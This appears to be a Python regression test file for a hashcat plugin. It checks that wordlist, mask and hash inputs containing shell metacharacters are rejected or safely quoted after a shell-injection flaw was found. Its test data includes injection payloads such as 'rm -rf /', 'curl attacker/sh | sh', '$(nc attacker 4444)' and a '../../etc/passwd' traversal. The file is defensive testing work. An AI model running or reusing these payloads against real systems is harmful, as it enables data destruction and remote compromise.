"""Regression tests for the hashcat plugin input-hardening path.

Chunk 4 review surfaced a shell-injection RCE on every registered remote
server: `_build_hashcat_command` joined user-controlled wordlist/mask into a
shell string that `asyncssh.conn.run` then executed via `sh -c`. These tests
pin down the hardened contract so it cannot regress.
"""
import unittest

from pydantic import ValidationError

from app.plugins.hashcat.plugin import CrackRequest, HashcatPlugin


class CrackRequestValidationTests(unittest.TestCase):
    def test_accepts_safe_basename_wordlist(self) -> None:
        req = CrackRequest(hash_value="abc", wordlist="rockyou.txt")
        self.assertEqual(req.wordlist, "rockyou.txt")

    def test_accepts_safe_absolute_wordlist(self) -> None:
        req = CrackRequest(hash_value="abc", wordlist="/usr/share/wordlists/rockyou.txt")
        self.assertEqual(req.wordlist, "/usr/share/wordlists/rockyou.txt")

    def test_rejects_wordlist_with_shell_metacharacters(self) -> None:
        for bad in (
            "rockyou.txt; rm -rf /",
            "rockyou.txt && curl attacker/sh | sh",
            "$(nc attacker 4444)",
            "`whoami`",
            "rockyou.txt\nreboot",
            "/tmp/w|bash",
        ):
            with self.subTest(value=bad):
                with self.assertRaises(ValidationError):
                    CrackRequest(hash_value="abc", wordlist=bad)

    def test_rejects_wordlist_path_traversal(self) -> None:
        with self.assertRaises(ValidationError):
            CrackRequest(hash_value="abc", wordlist="../../etc/passwd")

    def test_rejects_mask_with_shell_metacharacters(self) -> None:
        for bad in (
            "?a?a?a; reboot",
            "?a | nc attacker 4444",
            "?a && touch /tmp/pwned",
            "?a`id`",
        ):
            with self.subTest(value=bad):
                with self.assertRaises(ValidationError):
                    CrackRequest(hash_value="abc", mask=bad)

    def test_accepts_typical_hashcat_mask(self) -> None:
        req = CrackRequest(hash_value="abc", mask="?a?a?a?a?a?a")
        self.assertEqual(req.mask, "?a?a?a?a?a?a")
        req = CrackRequest(hash_value="abc", mask="Admin?d?d?d")
        self.assertEqual(req.mask, "Admin?d?d?d")


class BuildHashcatCommandQuotingTests(unittest.TestCase):
    """Validator rejects most dangerous inputs, but shlex.quote is the defense
    in depth if a future code path bypasses the pydantic validator."""

    def setUp(self) -> None:
        self.plugin = HashcatPlugin()

    def test_hash_value_with_single_quotes_is_quoted_safely(self) -> None:
        cmd = self.plugin._build_hashcat_command(
            hash_value="abc'; rm -rf /; '",
            hash_type_code="0",
            attack_code="0",
            wordlist="rockyou.txt",
            mask=None,
        )
        # Quoted hash value must not allow `rm -rf /` to escape to a new
        # shell token.
        self.assertIn("'abc'\"'\"'; rm -rf /; '\"'\"''", cmd)
        # Overall command still begins with the intended binary.
        self.assertTrue(cmd.startswith("hashcat "))

    def test_wordlist_quoted_even_if_validator_bypassed(self) -> None:
        cmd = self.plugin._build_hashcat_command(
            hash_value="abc",
            hash_type_code="0",
            attack_code="0",
            wordlist="rockyou.txt; rm -rf /",
            mask=None,
        )
        # shlex.quote wraps the whole value in single quotes so the `;` is literal.
        self.assertIn("'/usr/share/wordlists/rockyou.txt; rm -rf /'", cmd)

    def test_mask_quoted_even_if_validator_bypassed(self) -> None:
        cmd = self.plugin._build_hashcat_command(
            hash_value="abc",
            hash_type_code="0",
            attack_code="3",
            wordlist="rockyou.txt",
            mask="?a?a; reboot",
        )
        self.assertIn("'?a?a; reboot'", cmd)


if __name__ == "__main__":
    unittest.main()
